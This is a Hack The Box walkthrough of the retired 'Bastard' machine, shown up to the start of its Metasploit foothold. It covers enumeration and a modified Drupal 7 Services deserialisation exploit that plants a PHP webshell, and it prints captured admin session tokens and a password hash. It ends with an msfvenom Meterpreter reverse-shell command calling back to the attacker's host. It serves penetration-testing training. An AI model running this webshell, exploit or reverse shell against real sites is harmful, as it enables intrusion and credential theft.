---
title: "Hack The Box: Bastard"
date: 2026-09-13
ref: WU-007
summary: "Rooting the retired HTB 'Bastard' machine — exploiting a PHP deserialisation vulnerability in the Drupal 7 Services module to gain initial access as the IIS anonymous user, then escalating to SYSTEM via both Juicy Potato (abusing SeImpersonatePrivilege) and the MS15-051 kernel exploit on an unpatched Windows Server 2008 R2 build."
tags: [hack-the-box, drupal, cms, rce, php-deserialisation, drupalgeddon, cve-2018-7600, cve-2018-7602, windows, privilege-escalation, ms15-051, cve-2015-1701, juicy-potato, seimpersonateprivilege, php, iis]
---

<h1 align="center">Bastard — Hack The Box Write-up</h1>

<p align="center">
  <img src="{{ '/assets/img/htb-bastard/Bastard_logo.png' | relative_url }}" width="300"/>
</p>

**Description:** Bastard is not overly challenging, however it requires some knowledge of PHP in order to modify and use the proof of concept required for initial entry. This machine demonstrates the potential severity of vulnerabilities in content management systems.

**Retired machine — `bastard.htb`**

- **IP Address:** 10.129.57.233
- **Operating System:** Windows Server 2008 R2 Datacenter (Build 7600)
- **Architecture:** x64
- **Kernel:** 6.1.7600

**Credentials:**
```
Admin:$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE 
```

**Nmap**

```NMAP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-04 13:59 EDT
Nmap scan report for 10.129.57.233
Host is up (0.024s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.76 seconds

```

**Quick Services:**

|Port|Service|
|---|---|
|80|HTTP (IIS 7.5 — Drupal 7)|
|135|Microsoft RPC|
|49154|Microsoft RPC|

**Completion Status:**

- Root Flag: [Yes]
- User Flag: [Yes]
- Completion: [Complete] (100%)

---

## Enumeration

We start this box with our services and versions Nmap scan. Once complete, we can see one port running HTTP and two others running Windows RPC services. This gives us a pretty clear path moving forwards, so we'll start by looking at port 80.

We can also see that the safe scripts scan has given us some useful directories and files to investigate later, which it found by checking the `robots.txt` file.

In total, we have three ports open, and this gives us the answer to our first 'Guided Mode' tasks' question. The output has been trimmed to allow us to see what's relevant at a glance.
```bash
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Bastard]
└─$ nmap -sCV -oA Scans/Nmap-Service+Version 10.129.54.27

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
```

---
## HTTP (Port 80) — Drupal 7

At this point, HTTP seems like the most logical place to start. Although methodologies do exist for testing RPC ports, HTTP exposes a very large attack surface, and it would be prudent to check here first before moving on to the other ports. Ahead, we find a Drupal web application, and we can start investigating the possible attack vectors exposed by the application.

First, let's confirm what's being hosted on port 80. We use our browser (Firefox, as it's Kali's default) and head to `http://10.129.57.233`. When inspected, we find a Drupal web application, giving us the answer to 'Guided Mode' task two's question.
![HTTP Drupal7]({{ '/assets/img/htb-bastard/Bastard_HTTP_Drupal7.png' | relative_url }})

There are a few routes we can go down here. We can attempt password guessing and default credentials, create an account and look around a little, or attempt some directory brute forcing.

We make some attempts to log in using common username and password combinations, then look for any possible default credentials. We know the Drupal version is 7 from our Nmap scan, and after a quick Google search, we find that Drupal does not have a default administrator username or password.

Our thoughts turn to directory brute forcing next, but we remember that our earlier Nmap scan also gave us some entries from the `robots.txt` file. If we navigate to `http://10.129.57.233/robots.txt`, we're able to see a list of things the site is asking web crawlers not to index.

The file contains a description of what the `robots.txt` file actually does, saving us one of our usual **"What's That?"** callout boxes this time.

In short, it contains a list of files and directories that the site is asking web crawlers to either allow or disallow from being indexed, essentially politely asking them to follow its rules.

The **Allow** entries aren't particularly interesting to us (and have been omitted from the output), but the **Disallow** entries give us some very interesting candidates we can attempt to check ahead.
```HTML
# robots.txt
#
# This file is to prevent the crawling and indexing of certain parts
# of your site by web crawlers and spiders run by sites like Yahoo!
# and Google. By telling these "robots" where not to go on your site,
# you save bandwidth and server resources.
#
# This file will be ignored unless it is at the root of your host:
# Used:    http://example.com/robots.txt
# Ignored: http://example.com/site/robots.txt
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/robotstxt.html

User-agent: *
Crawl-delay: 10
# Directories
Disallow: /includes/ 
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt <-- Worth Checking
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```

We can see a good amount of things to try here, and we should attempt to test at least a few of them to see if we can identify any weaknesses.

We can see that `/CHANGELOG.txt` is in the Disallow list and is a great place to get started. This allows us to find the exact version of Drupal based on its top entry. We see version `7.54`, giving us our next answer for 'Guided Mode' task three's question.
```HTML
Drupal 7.54, 2017-02-01
-----------------------
- Modules are now able to define theme engines (API addition:
  https://www.drupal.org/node/2826480).
- Logging of searches can now be disabled (new option in the administrative
  interface).
- Added menu tree render structure to (pre-)process hooks for theme_menu_tree()
  (API addition: https://www.drupal.org/node/2827134).
- Added new function for determining whether an HTTPS request is being served
  (API addition: https://www.drupal.org/node/2824590).
- Fixed incorrect default value for short and medium date formats on the date
  type configuration page.
- File validation error message is now removed after subsequent upload of valid
  file.
- Numerous bug fixes.
- Numerous API documentation improvements.
- Additional performance improvements.
- Additional automated test coverage.
```

Testing a few of the links gives us 403 HTTP response codes, so we decide to run Feroxbuster to brute force the directories on the box. We soon learn that a vanilla scan isn't going to be much use.

The first iteration of several gives us a huge volume of results, with many of the redirects also leading to forbidden content. We eventually settle on the flags below to narrow things down to results that are more useful to us. The main ones we include are `-x`, which allows us to search for text and PHP files, and `-n`, which disables recursion; otherwise, we're left with a massive amount of results to work through.
```
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Bastard]
└─$ feroxbuster -u http://10.129.57.233 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -s 200 -t 50 -n -o Scans/Ferox-NonRecurse.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.57.233/
 🚩  In-Scope Url          │ 10.129.57.233
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ Scans/Ferox-NonRecurse.txt
 💲  Extensions            │ [txt, php]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       44l      290w     1874c http://10.129.57.233/INSTALL.pgsql.txt
200      GET       31l      209w     1298c http://10.129.57.233/INSTALL.sqlite.txt
200      GET       45l      262w     1717c http://10.129.57.233/INSTALL.mysql.txt
200      GET      307l      846w     8710c http://10.129.57.233/MAINTAINERS.txt
200      GET      400l     2475w    17995c http://10.129.57.233/INSTALL.txt
200      GET      246l     1501w    10123c http://10.129.57.233/UPGRADE.txt
200      GET      339l     2968w    18092c http://10.129.57.233/LICENSE.txt
200      GET     2284l    16004w   110781c http://10.129.57.233/CHANGELOG.txt
200      GET        1l        6w       42c http://10.129.57.233/xmlrpc.php
200      GET      146l      368w     7153c http://10.129.57.233/user/password
200      GET       79l      473w     2974c http://10.129.57.233/misc/jquery.once.js
200      GET       19l       96w     6274c http://10.129.57.233/themes/bartik/logo.png
200      GET      525l     2481w    17588c http://10.129.57.233/misc/drupal.js
200      GET        7l       35w    11296c http://10.129.57.233/misc/favicon.ico
200      GET      168l     1309w    78602c http://10.129.57.233/misc/jquery.js
200      GET      154l      463w     8158c http://10.129.57.233/user/register
200      GET      159l      413w     7634c http://10.129.57.233/node
200      GET      159l      413w     7634c http://10.129.57.233/
200      GET      159l      413w     7634c http://10.129.57.233/0
200      GET      152l      394w     7474c http://10.129.57.233/user
```

We actually spend a bit more time here than we should have. **TL;DR:** we had already found what we needed.

Knowing when to move on is an important skill. If you can't detach yourself from the idea of leaving no stone unturned, you can end up wasting a huge amount of time looking for something that isn't necessary, rather than actually testing what you've already found.

Sometimes, the best thing you can do is recognise that you have enough information and move on to testing it.

> **Warning — Rabbit Hole Warning**
> 
> Boxes like this will often contain rabbit holes and red herrings designed to waste your time. One of the hardest skills I've had to learn is recognising when I'm going too far down one and knowing when to put something down and try a different approach.
> 
> It's something I've struggled with in the past, and honestly, I still struggle with it today.
> 
> I'm leaving this here as a deliberate reminder, not just to myself but to anyone else who finds themselves getting stuck: **sometimes you need to step away, reset for a moment, and come back with a fresh perspective.** The answer might have been sitting right in front of you the entire time.
> 
> It's cliché, but when you find yourself hitting a wall or disappearing down a rabbit hole, remembering a few basic things can make a huge difference.
> - **Take a break.** When you hit a wall, stepping away for a while can be far more productive than continuing to force the problem. Sometimes pushing harder only makes the frustration worse.
> - **Eat and drink.** I can be particularly bad at this. If I'm frustrated or fascinated by something, it's surprisingly easy to forget the basics. Eventually, that catches up with you and your concentration suffers.
> - **Sleep.** Late-night sessions are probably part of the territory for most of us, but a good night's sleep can make a ridiculous difference. Sometimes the solution looks much more obvious after you've slept on it.
> - **Look after yourself.** This one is particularly important to me. I've struggled with my mental health for a long time, and I know firsthand how much being in a bad place can affect your mindset, patience and ability to think clearly. Looking after yourself isn't something that should be treated as separate from learning — it should always be part of the process.
>  
> **You don't have to solve everything right now. Sometimes the best move you can make is to step away.**

Coming back to the machine with a fresh perspective, we remember that we found the exact version in the changelog file earlier. Rather than trying to find something by hand, maybe we should search for what exploits are already known and work backwards.

We use SearchSploit and look for `Drupal` exploits. We're given a lot of results, so we decide to filter these down to what we feel might be best suited to our situation.

From the results, we can see **Drupal 7.x Module Services - Remote Code Execution**, labelled as `41564.php`. We can investigate this as a possible candidate in the next section.
```
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Bastard]
└─$ searchsploit drupal
-----------------------------------------------------------------------------------
Exploit Title                                             |  Path
-----------------------------------------------------------------------------------
Drupal 7.x Module Services - Remote Code Execution        | php/webapps/41564.php
Drupal < 7.58 - 'Drupalgeddon3' 
	(Authenticated) Remote Code (Metasploit)              | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3'
	(Authenticated) Remote Code Execution (PoC)           | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 
	'Drupalgeddon2' Remote Code Execution                 | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 
	'Drupalgeddon2' Remote Code Execution (Metasploit)    | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 
	'Drupalgeddon2' Remote Code Execution (PoC)           | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services 
	unserialize() Remote Command Execution (Metasploit)   | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module 
	Remote Code Execution                                 | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution        | php/webapps/46459.py
-----------------------------------------------------------------------------------
Shellcodes: No Results
```

---
## Remote Code Execution (Drupal 7.x Module Services)

In the last section, we found a possible candidate for exploiting the Drupal service. We can now inspect the selected exploit and attempt to understand how it works. After that, we can make the necessary modifications based on our scenario before deploying the exploit and attempting to gain a foothold on the machine.

The first thing we can do is grab the exploit using `searchsploit -m`, which mirrors the file into our working directory. We can then use `mv` to rename the file to `drupal.php`. This isn't strictly necessary, but renaming it makes the walkthrough easier to follow than repeatedly referring to the exploit by its numerical filename.
```bash
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ searchsploit -m php/webapps/41564.php           
  Exploit: Drupal 7.x Module Services - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/41564
     Path: /usr/share/exploitdb/exploits/php/webapps/41564.php
    Codes: N/A
 Verified: True
File Type: C++ source, ASCII text
Copied to: /home/kali/Documents/Hack The Box/Machines/Bastard/Exploit/41564.php


┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ mv 41564.php drupal.php  
```

We can now attempt to understand what the code does. This is a fairly complicated exploit, and I had to use an LLM (Claude) to help break it down for me. PHP deserialisation is not an easy attack to understand, but as with many things, if we can grasp the basics, we'll be in a far better position when it comes to modifying the exploit and understanding the process it uses to achieve its goal.

Using an LLM here isn't about having it do the work for us. It's about using it as another resource to help explain something we don't fully understand yet. We still need to validate what we're being told, understand the underlying concepts, and ultimately be able to explain what the exploit is doing ourselves.

> **What the Exploit Does (Claude)**
> 
> This exploit targets Drupal 7's **Services** module, which exposes site functionality (like the REST server) over an API. The bug is a **SQL injection** in how the module builds queries for its endpoint cache — but instead of using it to dump data, the script uses that injection to _rewrite_ a cached PHP object that Drupal later unserialises and trusts, turning the SQLi into full RCE. It works in three stages:
>
> 1. **Read the cache** — Using the SQLi, the script pulls the current serialised cache entry for the target REST endpoint. This cache includes the currently logged-in admin's session token and user object, which get saved locally.
> 2. **Poison the cache** — It crafts a malicious serialised PHP object and, via the same injection, overwrites that cache entry. The payload is built so that when Drupal deserialises it on the next request, it triggers a file-write instead of just returning data.
> 3. **Trigger the write and restore** — A follow-up request causes Drupal to deserialise the poisoned cache, writing the specified webshell out to disk. The script then restores the original cache entry so the endpoint keeps working normally and doesn't look tampered with.
>
> The end result is a PHP webshell on the server, plus an admin session cookie captured as a side effect of stage 1.

After taking some time to understand what we're working with, looking at the PHP code starts to make a little more sense. Looking through the script gives us some useful hints that our selection is valid and that we'll need to edit a few things in order to get this working.

In the image below, we can see several things of interest in the highlighted area. The main thing that sticks out is the `$url` variable, which we'll need to change to point towards our target. It also lists that the URL path with `drupal-7.54`, meaning we've chosen something that's very likely to work as it may have been tested on this version.

We now need to formulate a little list of things to do before the exploit is usable:

1. **Change the `$url` variable:** to our box's IP of `http://10.129.57.233`, otherwise the exploit won't reach the Bastard machine.
2. **Understand the endpoint variables:**: We see two variables named `&endpoint_path` and `$endpoint` that we're going to need to understand before moving forward with testing. We'll look into these as our next task.
3. **Modify the webshell:** We see that `$file` is a file that gets written to the machine. It writes a webshell using a randomized filename (for example, `dixuSOspsOUU.php`). We'll change the filename to `shell.php` and edit the payload to a simpler variation, allowing us to trigger commands through a basic GET request (`?cmd=`) rather than having to send raw PHP in a POST body each time.
![RCE DrupalPHP]({{ '/assets/img/htb-bastard/Bastard_RCE_DrupalPHP.png' | relative_url }})

In our previous Feroxbuster scan, we never found anything called `/rest_endpoint`, which means we're back to looking for evidence of its existence. We need to confirm that the endpoint is actually present on the target; otherwise, our attack won't work, as it is a required component of the exploitation process.


> **Flaky Connection**
> 
>One serious thing I'd like to note here is the machine's connection. Even though I was likely the only person working on this machine at the time (as its very old and retired), I found the connection to be extremely unstable.
>
>I tried several different tools and wordlists, with some estimating **upwards of eight hours** to complete. Increasing the number of threads to try and mitigate this created its own problems; the scans would run for a while before eventually starting to drop requests.
>
>In order to find the existence of the endpoint, I eventually had to turn to a walkthrough. Checking [0xdf's guide](https://0xdf.gitlab.io/2019/03/12/htb-bastard.html) helped a lot, and interestingly, his solution also uses a very old tool: **dirb**.
>
>In this case, `dirb` was the solution for me. It doesn't multi-thread its requests in the same way as some of the more modern tools, which meant it was able to find the endpoint we were looking for without running into the same connection issues.
>
>There was a downside, however: **the scan took around two and a half hours to complete.**
>
>It's not exactly the fastest way of doing things, but sometimes the older tools still have their place.


Firing up `dirb` eventually allows us to find the existence of the `/rest` endpoint. This appears to have been changed from the potential default expected by the exploit, which is another example of the creator making sure things don't just work out of the box and requiring us to try a little harder.

This is also exactly why taking the time to understand the exploit we're using is so important. Without understanding what the exploit is looking for, finding a differently named endpoint would be much harder to recognise as something we need to investigate.
```
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Bastard]
└─$ dirsearch -u http://10.129.57.233/ -e php -x 403,404 -t 5 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php | HTTP method: GET | Threads: 5 | Wordlist size: 9411

Output File: /home/kali/Documents/Hack The Box/Machines/Bastard/reports/http_10.129.57.233/__26-09-05_12-34-58.txt

Target: http://10.129.57.233/

[12:34:58] Starting: 
[12:35:18] 200 -    8KB - /%3f/
[12:56:47] 200 -  108KB - /CHANGELOG.TXT
[12:56:49] 200 -   32KB - /CHANGELOG.txt
[12:56:49] 200 -   32KB - /Changelog.txt
[12:56:49] 200 -   32KB - /ChangeLog.txt
[12:56:49] 200 -   32KB - /changelog.txt
[13:00:19] 200 -    1KB - /COPYRIGHT.txt
[13:12:06] 301 -  153B  - /includes  ->  http://10.129.57.233/includes/
[13:13:01] 200 -    3KB - /install.php
[13:13:07] 200 -    2KB - /INSTALL.mysql.txt
[13:13:07] 200 -    2KB - /install.mysql.txt
[13:13:07] 200 -    2KB - /INSTALL.pgsql.txt
[13:13:07] 200 -    2KB - /install.pgsql.txt
[13:13:09] 200 -    3KB - /install.php?profile=default
[13:13:09] 200 -   18KB - /INSTALL.TXT
[13:13:10] 200 -    6KB - /INSTALL.txt
[13:13:10] 200 -    6KB - /Install.txt
[13:13:10] 200 -    6KB - /install.txt
[13:16:08] 200 -   18KB - /LICENSE.txt
[13:16:08] 200 -    7KB - /license.txt
[13:18:25] 200 -    9KB - /MAINTAINERS.txt
[13:18:25] 200 -    2KB - /maintainers.txt
[13:20:33] 301 -  149B  - /misc  ->  http://10.129.57.233/misc/
[13:20:56] 301 -  152B  - /modules  ->  http://10.129.57.233/modules/
[13:22:49] 200 -    8KB - /node/1?_format=hal_json
[13:30:20] 301 -  153B  - /profiles  ->  http://10.129.57.233/profiles/
[13:31:41] 200 -    5KB - /README.TXT
[13:31:41] 200 -    2KB - /README.txt
[13:31:41] 200 -    2KB - /ReadMe.txt
[13:31:41] 200 -    2KB - /Readme.txt
[13:31:41] 200 -    2KB - /readme.txt
[13:32:26] 200 -   62B  - /rest
[13:32:27] 200 -   62B  - /rest/
[13:32:42] 200 -    2KB - /robots.txt
[13:33:17] 301 -  152B  - /scripts  ->  http://10.129.57.233/scripts/
[13:36:00] 301 -  150B  - /sites  ->  http://10.129.57.233/sites/
[13:36:03] 200 -  151B  - /sites/all/libraries/README.txt
[13:36:03] 200 -    1KB - /sites/all/modules/README.txt
[13:36:03] 200 - 1020B  - /sites/all/themes/README.txt
[13:36:03] 200 -    0B  - /sites/example.sites.php
[13:36:04] 200 -  904B  - /sites/README.txt
[13:41:07] 301 -  151B  - /themes  ->  http://10.129.57.233/themes/
[13:42:47] 200 -   10KB - /UPGRADE.txt
[13:42:47] 200 -    3KB - /upgrade.txt
[13:43:17] 200 -    7KB - /user
[13:43:21] 200 -    7KB - /user/
[13:43:25] 200 -    7KB - /user/login/
[13:49:41] 200 -   42B  - /xmlrpc.php

Task Completed
```

Once we discover the `/rest` endpoint, we need to check exactly what it is. Using `curl`, we can probe the endpoint and do two things.

First, we can validate that this is the REST API we require for the exploit to work. Secondly, although the URL path has been changed to `/rest`, the endpoint itself is still named `rest_endpoint`. This is important because the exploit URL path is looking for `rest_endpoint` and needs to be edited, where as the endpoint name remains the same and should not be modified.
``` Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ curl http://10.129.57.233/rest

Services Endpoint "rest_endpoint" has been setup successfully. 
```

Now we can finish modifying the `drupal.php` script from earlier. We update the `$endpoint_path` variable to `/rest`, which is the path the creator has changed, while keeping the `&endpoint` name as it is.

With our target now set in the `$url` variable, and the filename and data updated in `$file` function parameters, we can save the exploit and attempt to run it to gain a foothold on the machine.
```PHP
$url = 'http://10.129.57.233';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'shell.php',
    'data' => '<?php system($_REQUEST["cmd"]); ?>'
];
```

On our first run, we find that we're missing a dependency required for the PHP script to run. We need `php-curl` for the exploit to work, which we can install using the APT package manager.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ php drupal.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce

#!/usr/bin/php
PHP Fatal error:  Uncaught Error: Call to undefined function curl_init() in /home/kali/Documents/Hack The Box/Machines/Bastard/Exploit/drupal.php:254
Stack trace:
#0 /home/kali/Documents/Hack The Box/Machines/Bastard/Exploit/drupal.php(104): Browser->post()
#1 {main}
  thrown in /home/kali/Documents/Hack The Box/Machines/Bastard/Exploit/drupal.php on line 254
  
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ sudo apt update

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ sudo apt install php-curl
Upgrading:                      
  libapache2-mod-php8.4  php8.4-cli  php8.4-common  php8.4-mysql  php8.4-opcache  php8.4-readline

Installing:
  php-curl

Installing dependencies:
  libsodium26  php8.4-curl

Summary:
  Upgrading: 6, Installing: 3, Removing: 0, Not Upgrading: 2213
  Download size: 5,354 kB
  Space needed: 927 kB / 61.3 GB available   
```

The next time we run `drupal.php`, we find that the exploit works correctly and informs us that it has captured session information in `session.json` and user information in `user.json`. We can inspect these files in just a moment.

We also see that the `shell.php` file was successfully written to the machine. We can attempt to leverage this for access, but first we'll inspect the JSON files created by the exploit to see what information they contain.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ php drupal.php           
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.129.57.233/shell.php
```

Checking the session file first with `cat`, we can see that it contains the session information of the administrator. This could be useful if we want to import a cookie into our browser and access Drupal CMS control pannel as the admin user.
```JSON 
{
    "session_name": "SESS12dc2ce4f0d984dc6b350359bf0b0322",
    "session_id": "T8I68WXrAJbGklUvv8AbmNKXIW5zpWFnlUoUaTOvzJ4",
    "token": "DMzUfg-5C4DvzKa3ukA9xBC5rZ-6RziPmwAlNtfNHCA"
}
```

We also have the user information, which contains the administrator's Drupal 7 password hash. We'll return to this later in the **Beyond Root** section to see if we can crack it.

At this point, however, it's not required. We already have a written webshell, so spending more time trying to crack the password would be unnecessary. It makes more sense to validate we have code execution before attempting anything else.
```JSON
{
    "uid": "1",
    "name": "admin",
    "mail": "drupal@hackthebox.gr",
    "theme": "",
    "created": "1489920428",
    "access": "1492102672",
    "login": 1788660112,
    "status": "1",
    "timezone": "Europe\/Athens",
    "language": "",
    "picture": null,
    "init": "drupal@hackthebox.gr",
    "data": false,
    "roles": {
        "2": "authenticated user",
        "3": "administrator"
    },
    "rdf_mapping": {
        "rdftype": [
            "sioc:UserAccount"
        ],
        "name": {
            "predicates": [
                "foaf:name"
            ]
        },
        "homepage": {
            "predicates": [
                "foaf:page"
            ],
            "type": "rel"
        }
    },
    "pass": "$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE"
```

In the next section, we can attempt to access the machine by leveraging our webshell. If we can confirm RCE, we can then chain this into gaining a more interactive session on the machine.

---
## Initial Access

With `shell.php` written to the machine, we can now turn our focus to confirming RCE. Once confirmed, we'll carry out some basic reconnaissance before attempting to gain a more interactive session on the machine.

It's important to note that, from this point, we'll be splitting our approach into both an automated and a manual path. This allows us to demonstrate both approaches and show how we might navigate the machine depending on which path we choose to take.

We first start by confirming RCE on the machine using the `shell.php` webshell we placed earlier. We begin with the `whoami` command to confirm the context we're running under. The response shows that we're running as `nt authority\iusr`, which also gives us the answer to 'Guided Mode' task four's question.
```bash
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ curl http://10.129.57.233/shell.php?cmd=whoami
nt authority\iusr <-- Task 4
```

It's in our interest to understand the machine a little more in depth before attempting to upload a shell. If we decide to use an executable reverse shell, we'll need to determine the architecture of the box so we can select an appropriate payload.

We run the `systeminfo` command through our webshell using `curl`, which gives us a few useful pieces of information to work with. The first thing we notice is that the machine is running a 64-bit architecture. We can also see that no hotfixes have been applied to the machine, meaning it has never been patched. This gives us the next answer to 'Guided Mode' task five's question.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ curl http://10.129.57.233/shell.php?cmd=systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 
System Boot Time:          6/9/2026, 4:52:33 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.604 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.626 MB
Virtual Memory: In Use:    469 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.57.233
```

## Foothold for Automated Workflow

If we decide to take an automated approach, we can use Metasploit to assist us from this point onwards. Although this approach is generally considered less hands-on and allows the tools to do much of the heavy lifting for us, it's still useful from a learning perspective. We can work backwards through the automated workflow to understand what is happening and use that knowledge to inform our manual approach.

We first generate a Meterpreter shell using `msfvenom` and call it `met.exe`, giving us an easy way to identify the file when we retrieve it. We then spin up an SMB server using `impacket-smbserver` and call our share `kali`. We're not attempting to evade detection here, so there's no need to overcomplicate things; we'll simply keep the setup as straightforward as possible.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.62 LPORT=1234 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: met.exe

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
